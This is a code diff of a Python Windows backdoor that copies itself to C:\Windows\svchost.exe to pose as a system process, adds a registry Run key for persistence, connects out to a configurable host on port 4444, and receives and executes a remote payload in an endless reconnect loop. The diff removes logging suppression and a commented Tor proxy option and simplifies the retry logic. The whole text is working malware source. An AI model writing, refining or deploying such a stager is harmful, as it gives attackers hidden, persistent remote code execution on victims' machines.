@@ -24,15 +24,11 @@
 #
 
 ## IMPORTS ##
-import socket,subprocess,struct,os,sys,logging,time
+import socket,subprocess,struct,os,sys,time
 
 ## This must be changed
 HOST = '' # HOST IP
 PORT = 4444 # PORT IP
-
-## LOGGING DISABLED ##
-log = logging.getLogger()
-log.disabled = True
 
 def main():
     # Check file if existing
@@ -40,7 +36,6 @@ def main():
     checkfile = os.path.isfile("C:\\Windows\svchost.exe")
     if checkfile == True:
         exist()
-        pass
     else:
     # Copy file to C:
         copyfile(os.path.basename(sys.argv[0]), "C:\\Windows\svchost.exe")
@@ -48,41 +43,22 @@ def main():
         subprocess.call("reg add HKCU\Software\Microsoft\windows\CurrentVersion\Run /v svchost /t REG_SZ /d C:\\Windows\svchost.exe /f", shell=True)
     # Connect to Server
         connect()
-        pass
-    pass
+
 
 def connect():
     # Main sequence for receiving socks packets
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        #s = socks.socksocket()
-        #s.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", port=9050)
         s.connect((HOST, PORT))
         shell=struct.unpack('>I',s.recv(4))[0]
         data=s.recv(shell)
         while len(data)<shell:
             data+=s.recv(shell-len(data))
             exec(data,{'s':s})
-    except IOError, e:
-        if e.errno == 10061:
-            time.sleep(1)
-            connect()
-        if e.errno == 10054:
-            time.sleep(1)
-            connect()
-        if e.errno == 10056:
-            time.sleep(1)
-            connect()
-        if e.errno == 10065:
-            time.sleep(1)
-            connect()
-        if e.errno == 10060:
-            time.sleep(1)
-            connect()
-        else:
-            raise e
+    except socket.error as e:
+	time.sleep(1)
+	connect()
 
-    pass
 
 def exist():
     #if file is existing
@@ -90,8 +66,6 @@ def exist():
     pass
 
 if __name__ == '__main__':
-        main()
-        #loop
-        while True:
-            main()
-            pass
+    while True:
+      main()
+
